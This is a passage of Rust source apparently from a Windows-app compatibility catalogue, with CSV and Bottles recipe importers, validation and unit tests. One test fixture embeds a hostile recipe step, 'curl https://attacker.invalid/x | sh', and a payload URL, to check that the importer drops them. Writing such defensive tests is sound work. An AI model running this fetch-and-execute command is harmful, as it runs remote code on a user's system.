        value.trim().to_ascii_lowercase().as_str(),
        "true" | "yes" | "on" | "1"
    )
}

fn bottles_slug(name: &str, executable: &str) -> String {
    let mut slug = String::new();
    for character in format!("{name}-{executable}").chars() {
        if character.is_ascii_alphanumeric() {
            slug.push(character.to_ascii_lowercase());
        } else if !slug.ends_with('-') {
            slug.push('-');
        }
    }
    slug.trim_matches('-').to_owned()
}

fn parse_csv_rows(input: &str) -> Result<Vec<Vec<String>>, CatalogueError> {
    const MAX_ROWS: usize = 100_000;
    let bytes = input.as_bytes();
    let mut rows = Vec::new();
    let mut row = Vec::new();
    let mut field = Vec::new();
    let mut quoted = false;
    let mut closed_quote = false;
    let mut index = 0;
    while index < bytes.len() {
        let Some(&byte) = bytes.get(index) else {
            return Err(CatalogueError::InvalidUmuCsv(
                "invalid byte offset".to_owned(),
            ));
        };
        if quoted {
            if byte == b'"' {
                if bytes.get(index.saturating_add(1)) == Some(&b'"') {
                    field.push(b'"');
                    index = index.saturating_add(2);
                } else {
                    quoted = false;
                    closed_quote = true;
                    index = index.saturating_add(1);
                }
            } else {
                field.push(byte);
                index = index.saturating_add(1);
            }
            continue;
        }
        if closed_quote {
            if byte == b' ' || byte == b'\t' {
                index = index.saturating_add(1);
                continue;
            }
            if byte != b',' && byte != b'\n' && byte != b'\r' {
                return Err(CatalogueError::InvalidUmuCsv(
                    "characters after closing quote".to_owned(),
                ));
            }
            closed_quote = false;
        }
        match byte {
            b'"' if field.is_empty() => {
                quoted = true;
                index = index.saturating_add(1);
            }
            b'"' => {
                return Err(CatalogueError::InvalidUmuCsv(
                    "quote inside unquoted field".to_owned(),
                ));
            }
            b',' => {
                row.push(csv_field(&field)?);
                field.clear();
                index = index.saturating_add(1);
            }
            b'\n' => {
                row.push(csv_field(&field)?);
                field.clear();
                if !row.is_empty() {
                    if rows.len() >= MAX_ROWS {
                        return Err(CatalogueError::InvalidUmuCsv(
                            "row count exceeds limit".to_owned(),
                        ));
                    }
                    rows.push(std::mem::take(&mut row));
                }
                index = index.saturating_add(1);
            }
            b'\r' => {
                if bytes.get(index.saturating_add(1)) != Some(&b'\n') {
                    return Err(CatalogueError::InvalidUmuCsv(
                        "bare carriage return".to_owned(),
                    ));
                }
                index = index.saturating_add(1);
            }
            _ => {
                field.push(byte);
                index = index.saturating_add(1);
            }
        }
    }
    if quoted || closed_quote {
        return Err(CatalogueError::InvalidUmuCsv(
            "unterminated quoted field".to_owned(),
        ));
    }
    if !field.is_empty() || !row.is_empty() {
        if rows.len() >= MAX_ROWS {
            return Err(CatalogueError::InvalidUmuCsv(
                "row count exceeds limit".to_owned(),
            ));
        }
        row.push(csv_field(&field)?);
        rows.push(row);
    }
    Ok(rows)
}

fn csv_field(bytes: &[u8]) -> Result<String, CatalogueError> {
    String::from_utf8(bytes.to_vec())
        .map_err(|_| CatalogueError::InvalidUmuCsv("field is not UTF-8".to_owned()))
}

fn missing_umu_field(name: &str) -> CatalogueError {
    CatalogueError::InvalidUmuCsv(format!("missing {name} field"))
}

fn umu_slug(row: &UmuCsvRow) -> Result<String, CatalogueError> {
    let mut slug = String::new();
    for character in format!("{}-{}-{}", row.store, row.codename, row.umu_id).chars() {
        if character.is_ascii_alphanumeric() {
            slug.push(character.to_ascii_lowercase());
        } else if !slug.ends_with('-') {
            slug.push('-');
        }
    }
    let slug = slug.trim_matches('-').to_owned();
    if slug.is_empty() {
        return Err(CatalogueError::InvalidUmuCsv(
            "identity produces empty ID".to_owned(),
        ));
    }
    Ok(slug)
}

fn plan_from_record(record: &Record, kind: MatchKind) -> LaunchPlan {
    LaunchPlan {
        record_id: Some(record.id.clone()),
        match_kind: kind,
        runtime: Runtime {
            id: if record.recipe.layer == Layer::Vm {
                String::from(WINDOWS_VM_RUNTIME_ID)
            } else {
                record.id.clone()
            },
            layer: record.recipe.layer,
        },
        runner: record.recipe.runner.clone(),
        settings: record.recipe.settings.clone(),
        security_profile: record.recipe.security_profile.clone(),
        proton_recipe: record.recipe.proton_recipe.clone(),
        compatibility_grade: record.compatibility_grade,
    }
}

fn default_wine_plan() -> LaunchPlan {
    LaunchPlan {
        record_id: None,
        match_kind: MatchKind::DefaultWine,
        runtime: Runtime::default_wine(),
        runner: Runner::wine_default(),
        settings: RunnerSettings::default(),
        security_profile: SecurityProfileRef(String::from("windows-app")),
        proton_recipe: None,
        compatibility_grade: None,
    }
}

#[derive(Clone, Debug, Default)]
struct NormalizedQuery {
    package_id: Option<String>,
    app_id: Option<String>,
    game_id: Option<String>,
    executable: Option<String>,
    executable_sha256: Option<String>,
    installer_sha256: Option<String>,
    store: Option<String>,
    store_product: Option<String>,
    publisher: Option<String>,
    product: Option<String>,
}

type NormalizedKey = NormalizedQuery;

impl NormalizedKey {
    fn has_identity(&self) -> bool {
        self.package_id.is_some()
            || self.app_id.is_some()
            || self.game_id.is_some()
            || self.executable.is_some()
            || self.executable_sha256.is_some()
            || self.installer_sha256.is_some()
            || self.store.is_some()
            || self.store_product.is_some()
            || self.publisher.is_some()
            || self.product.is_some()
    }

    fn matches(&self, query: &NormalizedQuery) -> bool {
        fn equal_if_present(key: Option<&String>, value: Option<&String>) -> bool {
            key.is_none_or(|key| value == Some(key))
        }
        equal_if_present(self.package_id.as_ref(), query.package_id.as_ref())
            && equal_if_present(self.app_id.as_ref(), query.app_id.as_ref())
            && equal_if_present(self.game_id.as_ref(), query.game_id.as_ref())
            && equal_if_present(self.executable.as_ref(), query.executable.as_ref())
            && equal_if_present(
                self.executable_sha256.as_ref(),
                query.executable_sha256.as_ref(),
            )
            && equal_if_present(
                self.installer_sha256.as_ref(),
                query.installer_sha256.as_ref(),
            )
            && equal_if_present(self.store.as_ref(), query.store.as_ref())
            && equal_if_present(self.store_product.as_ref(), query.store_product.as_ref())
            && equal_if_present(self.publisher.as_ref(), query.publisher.as_ref())
            && equal_if_present(self.product.as_ref(), query.product.as_ref())
    }
}

fn record_match_kind(record: &Record, query: &NormalizedQuery) -> Option<MatchKind> {
    record
        .matches
        .iter()
        .filter_map(|key| {
            let key = key.normalized();
            if !key.matches(query) {
                return None;
            }
            if key.executable_sha256.is_some() || key.installer_sha256.is_some() {
                Some(MatchKind::ExecutableDigest)
            } else if key.package_id.is_some() {
                Some(MatchKind::PackageId)
            } else if key.store.is_some() || key.store_product.is_some() {
                Some(MatchKind::StoreProduct)
            } else if key.app_id.is_some() {
                Some(MatchKind::AppId)
            } else if key.game_id.is_some() {
                Some(MatchKind::GameId)
            } else if key.executable.is_some() {
                Some(MatchKind::Executable)
            } else if key.publisher.is_some() || key.product.is_some() {
                Some(MatchKind::ProductPublisher)
            } else {
                None
            }
        })
        .max_by_key(|kind| kind.score())
}

fn validate_key(key: &MatchKey, record_id: &str) -> Result<(), CatalogueError> {
    let fields = [
        ("package id", key.package_id.as_deref()),
        ("application id", key.app_id.as_deref()),
        ("game id", key.game_id.as_deref()),
        ("store", key.store.as_deref()),
        ("store product", key.store_product.as_deref()),
        ("executable", key.executable.as_deref()),
        ("executable SHA-256", key.executable_sha256.as_deref()),
        ("installer SHA-256", key.installer_sha256.as_deref()),
        ("publisher", key.publisher.as_deref()),
        ("product", key.product.as_deref()),
    ];
    if fields.iter().all(|(_, value)| value.is_none()) {
        return Err(CatalogueError::EmptyMatchKey(record_id.to_owned()));
    }
    for (name, value) in fields {
        if let Some(value) = value {
            validate_token(name, value)?;
        }
    }
    if let Some(digest) = key.executable_sha256.as_deref()
        && (digest.len() != 64 || !digest.bytes().all(|byte| byte.is_ascii_hexdigit()))
    {
        return Err(CatalogueError::InvalidExecutableDigest {
            record_id: record_id.to_owned(),
            digest: digest.to_owned(),
        });
    }
    if let Some(digest) = key.installer_sha256.as_deref()
        && (digest.len() != 64 || !digest.bytes().all(|byte| byte.is_ascii_hexdigit()))
    {
        return Err(CatalogueError::InvalidExecutableDigest {
            record_id: record_id.to_owned(),
            digest: digest.to_owned(),
        });
    }
    Ok(())
}

fn validate_security_profile(profile: &SecurityProfileRef) -> Result<(), CatalogueError> {
    let value = profile.as_str();
    if value.is_empty()
        || value.len() > 128
        || value.starts_with('.')
        || value.contains('/')
        || value.contains('\\')
        || value.chars().any(char::is_whitespace)
    {
        return Err(CatalogueError::InvalidSecurityProfile(value.to_owned()));
    }
    Ok(())
}

fn validate_settings(settings: &RunnerSettings) -> Result<(), CatalogueError> {
    validate_token("Windows version", &settings.windows_version)?;
    for (key, value) in &settings.environment {
        validate_token("environment key", key)?;
        validate_token("environment value", value)?;
    }
    for (key, value) in &settings.graphics {
        validate_token("graphics setting", key)?;
        validate_token("graphics value", value)?;
    }
    for component in &settings.components {
        validate_token("runner component", component)?;
    }
    Ok(())
}

fn validate_token(kind: &str, value: &str) -> Result<(), CatalogueError> {
    if value.trim().is_empty() || value.len() > 256 || value.chars().any(char::is_control) {
        return Err(CatalogueError::InvalidValue {
            kind: kind.to_owned(),
            value: value.to_owned(),
        });
    }
    Ok(())
}

fn normalize_optional(value: Option<&str>) -> Option<String> {
    value
        .map(|value| value.trim().to_lowercase())
        .filter(|value| !value.is_empty())
}

fn normalize_executable(value: Option<&str>) -> Option<String> {
    let value = normalize_optional(value)?;
    let value = value.replace('\\', "/");
    Some(
        value
            .rsplit('/')
            .next()
            .map_or_else(|| value.clone(), str::to_owned),
    )
}

fn normalize_digest(value: Option<&str>) -> Option<String> {
    normalize_optional(value)
}

fn default_record_version() -> u32 {
    1
}

fn default_windows_version() -> String {
    String::from("win10")
}

/// Errors are intentionally descriptive but do not expose host paths or
/// privileged operations; callers can show them directly in catalogue UI.
#[derive(Clone, Debug, Eq, Error, PartialEq)]
pub enum CatalogueError {
    #[error("unsupported catalogue schema {0}; refusing to load it")]
    UnsupportedSchema(u16),
    #[error("invalid JSON catalogue: {0}")]
    InvalidJson(String),
    #[error("invalid {kind}: {value:?}")]
    InvalidValue { kind: String, value: String },
    #[error("catalogue record {record_id:?} has invalid executable SHA-256 {digest:?}")]
    InvalidExecutableDigest { record_id: String, digest: String },
    #[error("invalid security profile {0:?}")]
    InvalidSecurityProfile(String),
    #[error("duplicate catalogue record {0:?}")]
    DuplicateRecord(String),
    #[error("catalogue record {0:?} has no match keys")]
    NoMatchKeys(String),
    #[error("catalogue record {0:?} has an empty match key")]
    EmptyMatchKey(String),
    #[error("catalogue record {id:?} uses unsupported version {version}")]
    UnsupportedRecordVersion { id: String, version: u32 },
    #[error("Wine record {id:?} uses unsupported runner family {family:?}")]
    InvalidWineRunner { id: String, family: String },
    #[error("Proton record {0:?} must name a recipe")]
    ProtonRecipeRequired(String),
    #[error("non-Proton record {0:?} contains a Proton recipe")]
    UnexpectedProtonRecipe(String),
    #[error("Proton record {id:?} uses unsupported runner family {family:?}")]
    InvalidProtonRunner { id: String, family: String },
    #[error("VM record {id:?} must use the windows-vm runner, not {family:?}")]
    InvalidVmRunner { id: String, family: String },
    #[error("invalid UMU CSV: {0}")]
    InvalidUmuCsv(String),
    #[error("invalid Bottles recipe: {0}")]
    InvalidBottlesRecipe(String),
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> SecurityProfileRef {
        SecurityProfileRef::new("windows-app").expect("valid fixture profile")
    }

    fn wine_record(id: &str, key: MatchKey) -> Record {
        Record {
            id: id.to_owned(),
            version: 1,
            provenance: Provenance::BuiltIn,
            signed: false,
            compatibility_grade: None,
            matches: vec![key],
            recipe: Recipe {
                layer: Layer::Wine,
                runner: Runner::new("wine", "11").expect("valid fixture runner"),
                settings: RunnerSettings::default(),
                security_profile: profile(),
                proton_recipe: None,
            },
        }
    }

    fn catalogue(records: Vec<Record>) -> Catalogue {
        Catalogue {
            schema_version: CATALOGUE_SCHEMA_VERSION,
            records,
        }
    }

    #[test]
    #[allow(
        clippy::too_many_lines,
        reason = "each phase keeps one former test's body verbatim"
    )]
    fn catalogue_matches_rank_identity_digest_and_provenance_deterministically() {
        {
            let key = MatchKey {
                executable: Some(String::from("  Program\\APP.EXE  ")),
                ..MatchKey::default()
            };
            assert!(key.matches(&ApplicationQuery::executable("/tmp/program/app.exe")));
        }
        {
            let executable = wine_record(
                "z-executable",
                MatchKey {
                    executable: Some(String::from("app.exe")),
                    ..MatchKey::default()
                },
            );
            let exact = wine_record(
                "a-exact",
                MatchKey {
                    app_id: Some(String::from("com.example.app")),
                    executable: Some(String::from("app.exe")),
                    ..MatchKey::default()
                },
            );
            let catalogue = catalogue(vec![executable, exact]);
            let resolver = catalogue.resolver().expect("valid catalogue");
            let plan = resolver.resolve(
                &ApplicationQuery {
                    app_id: Some(String::from("COM.EXAMPLE.APP")),
                    executable: Some(String::from("app.exe")),
                    ..ApplicationQuery::default()
                },
                VmFallback::Disabled,
            );
            assert_eq!(plan.record_id.as_deref(), Some("a-exact"));
            assert_eq!(plan.match_kind, MatchKind::AppId);
        }
        {
            let mut digest_record = wine_record(
                "digest",
                MatchKey {
                    executable_sha256: Some(
                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                            .to_owned(),
                    ),
                    ..MatchKey::default()
                },
            );
            digest_record.signed = true;
            let package_record = wine_record(
                "package",
                MatchKey {
                    package_id: Some("com.example.editor".to_owned()),
                    ..MatchKey::default()
                },
            );
            let catalogue = catalogue(vec![package_record, digest_record]);
            let resolver = catalogue.resolver().expect("valid catalogue");
            let plan = resolver.resolve(
                &ApplicationQuery {
                    package_id: Some("com.example.editor".to_owned()),
                    executable_sha256: Some(
                        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                            .to_owned(),
                    ),
                    ..ApplicationQuery::default()
                },
                VmFallback::Disabled,
            );
            assert_eq!(plan.record_id.as_deref(), Some("digest"));
            assert_eq!(plan.match_kind, MatchKind::ExecutableDigest);
        }
        {
            let mut unsigned = wine_record(
                "unsigned",
                MatchKey {
                    executable: Some("app.exe".to_owned()),
                    ..MatchKey::default()
                },
            );
            unsigned.provenance = Provenance::User;
            let mut signed = wine_record(
                "signed",
                MatchKey {
                    executable: Some("app.exe".to_owned()),
                    ..MatchKey::default()
                },
            );
            signed.signed = true;
            let catalogue = catalogue(vec![unsigned, signed]);
            let resolver = catalogue.resolver().expect("valid catalogue");
            assert_eq!(
                resolver
                    .resolve(
                        &ApplicationQuery::executable("app.exe"),
                        VmFallback::Disabled
                    )
                    .record_id
                    .as_deref(),
                Some("signed")
            );
        }
    }

    #[test]
    fn runner_selection_defaults_to_wine_and_never_implies_proton_or_vm() {
        {
            let catalogue = catalogue(Vec::new());
            let resolver = catalogue.resolver().expect("valid catalogue");
            let plan = resolver.resolve(
                &ApplicationQuery::executable("thing.exe"),
                VmFallback::Disabled,
            );
            assert_eq!(plan.runtime.layer, Layer::Wine);
            assert_eq!(plan.match_kind, MatchKind::DefaultWine);
            assert_eq!(plan.runner.family, "wine");
        }
        {
            let mut record = wine_record(
                "game",
                MatchKey {
                    game_id: Some(String::from("42")),
                    ..MatchKey::default()
                },
            );
            record.recipe.layer = Layer::Proton;
            assert_eq!(
                catalogue(vec![record.clone()]).validate(),
                Err(CatalogueError::ProtonRecipeRequired(String::from("game")))
            );
            record.recipe.proton_recipe = Some(String::from("steam-game-42"));
            assert_eq!(
                catalogue(vec![record]).validate(),
                Err(CatalogueError::InvalidProtonRunner {
                    id: String::from("game"),
                    family: String::from("wine")
                })
            );
        }
        {
            let mut vm = wine_record(
                "legacy",
                MatchKey {
                    product: Some(String::from("Legacy")),
                    ..MatchKey::default()
                },
            );
            vm.recipe.layer = Layer::Vm;
            vm.recipe.runner = Runner::new("windows-vm", "managed").expect("valid fixture runner");
            let catalogue = catalogue(vec![vm]);
            let resolver = catalogue.resolver().expect("valid catalogue");
            let query = ApplicationQuery {
                product: Some(String::from("legacy")),
                ..ApplicationQuery::default()
            };
            assert_eq!(
                resolver.resolve(&query, VmFallback::Disabled).match_kind,
                MatchKind::DefaultWine
            );
            assert_eq!(
                resolver.resolve(&query, VmFallback::Explicit).runtime.layer,
                Layer::Vm
            );
            assert_eq!(
                resolver.resolve(&query, VmFallback::Explicit).runtime.id,
                WINDOWS_VM_RUNTIME_ID
            );
        }
        {
            let duplicate = wine_record(
                "same",
                MatchKey {
                    product: Some(String::from("x")),
                    ..MatchKey::default()
                },
            );
            let malformed_catalogue = catalogue(vec![duplicate.clone(), duplicate]);
            assert_eq!(
                malformed_catalogue.validate(),
                Err(CatalogueError::DuplicateRecord(String::from("same")))
            );
            assert!(Catalogue::from_json(r#"{"schema_version":99,"records":[]}"#).is_err());
            let malformed_digest = wine_record(
                "bad-digest",
                MatchKey {
                    executable_sha256: Some("not-a-digest".to_owned()),
                    ..MatchKey::default()
                },
            );
            assert!(matches!(
                catalogue(vec![malformed_digest]).validate(),
                Err(CatalogueError::InvalidExecutableDigest { .. })
            ));
        }
    }

    #[test]
    fn umu_csv_imports_proton_records_with_primary_store_ids() {
        {
            let csv = "TITLE,STORE,CODENAME,UMU_ID,EXTRA\n\"A, Great Game\",steam,GreatGame,123,ignored\n";
            let rows = parse_umu_csv(csv).expect("valid UMU CSV");
            assert_eq!(rows.len(), 1);
            assert_eq!(rows[0].title, "A, Great Game");
            assert_eq!(rows[0].query().game_id.as_deref(), Some("123"));
            assert_eq!(rows[0].query().store.as_deref(), Some("steam"));
            assert_eq!(rows[0].query().store_product.as_deref(), Some("GreatGame"));
            let runner = Runner::new("umu-proton", "10").expect("valid runner");
            let security_profile = profile();
            let settings = RunnerSettings::default();
            let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
                .expect("valid Proton records");
            assert_eq!(records[0].recipe.layer, Layer::Proton);
            assert_eq!(records[0].recipe.proton_recipe.as_deref(), Some("umu-123"));
            let catalogue = Catalogue {
                schema_version: CATALOGUE_SCHEMA_VERSION,
                records,
            };
            let resolver = catalogue.resolver().expect("valid UMU catalogue");
            let store_query = ApplicationQuery {
                store: Some("EGS".to_owned()),
                store_product: Some("Catnip".to_owned()),
                ..ApplicationQuery::default()
            };
            // The sample row is Steam/GreatGame, so this does not accidentally
            // resolve by the derived UMU ID.
            assert_eq!(
                resolver
                    .resolve(&store_query, VmFallback::Disabled)
                    .match_kind,
                MatchKind::DefaultWine
            );
            let direct_query = ApplicationQuery {
                game_id: Some("123".to_owned()),
                ..ApplicationQuery::default()
            };
            assert_eq!(
                resolver
                    .resolve(&direct_query, VmFallback::Disabled)
                    .match_kind,
                MatchKind::GameId
            );
        }
        {
            assert!(parse_umu_csv("TITLE,STORE\nGame,steam\n").is_err());
            assert!(
                parse_umu_csv("TITLE,STORE,CODENAME,UMU_ID\n\"unterminated,steam,x,1\n").is_err()
            );
        }
        {
            let csv = "TITLE,STORE,CODENAME,UMU_ID\nCatnip,EGS,Catnip,397540\nGOG title,GOG,123456,765432\n";
            let rows = parse_umu_csv(csv).expect("valid store catalogue");
            let runner = Runner::new("umu-proton", "10").expect("valid runner");
            let security_profile = profile();
            let settings = RunnerSettings::default();
            let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
                .expect("valid Proton records");
            assert_eq!(
                records[0].recipe.proton_recipe.as_deref(),
                Some("umu-397540")
            );
            assert_eq!(rows[1].store, "GOG");
            assert_eq!(rows[1].codename, "123456");
            let catalogue = Catalogue {
                schema_version: CATALOGUE_SCHEMA_VERSION,
                records,
            };
            let resolver = catalogue.resolver().expect("valid catalogue");
            let catnip = ApplicationQuery {
                store: Some("egs".to_owned()),
                store_product: Some("catnip".to_owned()),
                ..ApplicationQuery::default()
            };
            assert_eq!(
                resolver
                    .resolve(&catnip, VmFallback::Disabled)
                    .record_id
                    .as_deref(),
                Some("umu-egs-catnip-397540")
            );
            let gog = ApplicationQuery {
                store: Some("gog".to_owned()),
                store_product: Some("123456".to_owned()),
                ..ApplicationQuery::default()
            };
            assert_eq!(
                resolver.resolve(&gog, VmFallback::Disabled).match_kind,
                MatchKind::StoreProduct
            );
        }
    }

    #[test]
    fn bottles_metadata_imports_only_safe_bounded_fields() {
        {
            let recipe = r"
    Name: Evernote
    Arch: win64
    Grade: Gold
    DXVK: true
    VKD3D: false
    Sync: fsync
    Dependencies:
      - corefonts
      - dotnet48
    Programs:
      Evernote:
        Executable: Evernote.exe
    Steps:
      - executable: /tmp/evil.exe
      - command: curl https://attacker.invalid/x | sh
      - url: https://attacker.invalid/payload
    ";
            let programs = parse_bottles_recipe(recipe).expect("valid Evernote recipe");
            assert_eq!(programs.len(), 1);
            assert_eq!(programs[0].executable, "Evernote.exe");
            assert_eq!(programs[0].grade, CompatibilityGrade::Gold);
            assert!(programs[0].dependencies.contains("corefonts"));
            assert!(programs[0].dxvk);
            assert_eq!(programs[0].sync.as_deref(), Some("fsync"));
            assert!(!programs[0].explanation().contains("attacker"));
            let runner = Runner::new("wine", "11").expect("valid runner");
            let profile = profile();
            let records = wine_records_from_bottles_recipe(recipe, &runner, &profile)
                .expect("valid Wine records");
            assert_eq!(records[0].provenance, Provenance::Community);
            assert_eq!(
                records[0].compatibility_grade,
                Some(CompatibilityGrade::Gold)
            );
            assert_eq!(records[0].recipe.settings.components.len(), 2);
        }
        {
            let recipe = "Name: Bad\nExecutable: /home/user/evil.exe\n";
            assert!(parse_bottles_recipe(recipe).is_err());
        }
        {
            let duplicate = "Name: App\nGrade: Gold\nGrade: Platinum\nExecutable: app.exe\n";
            assert!(parse_bottles_recipe(duplicate).is_err());
            let mut csv = String::from("TITLE,STORE,CODENAME,UMU_ID\n");
            for _ in 0..100_001 {
                csv.push_str("Game,steam,game,1\n");
            }
            assert!(parse_umu_csv(&csv).is_err());
        }
        {
            let recipe = "Name: App\nExecutable: app.exe\n";
            let profile = profile();
            let proton_runner = Runner::new("umu-proton", "10").expect("valid runner");
            assert!(wine_records_from_bottles_recipe(recipe, &proton_runner, &profile).is_err());
            let vm_runner = Runner::new("windows-vm", "managed").expect("valid runner");
            assert!(wine_records_from_bottles_recipe(recipe, &vm_runner, &profile).is_err());
        }
    }
}
